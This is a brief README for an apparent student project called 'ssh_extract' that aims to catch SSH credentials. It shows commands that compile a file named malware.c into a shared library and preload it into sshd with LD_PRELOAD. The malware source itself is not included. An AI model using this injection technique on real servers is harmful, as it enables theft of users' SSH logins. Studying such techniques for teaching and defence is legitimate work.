# ssh_extract
This is a school project for catching ssh credentials 

## How to use it ?

```bash
    └─$ gcc -Wall -fPIC -shared -o malware.so malware.c             
    └─$ LD_PRELOAD=/path/to/malware.so /usr/sbin/sshd 
```

Kades KOUKPONOU

Simon CORVISIER 3SI-4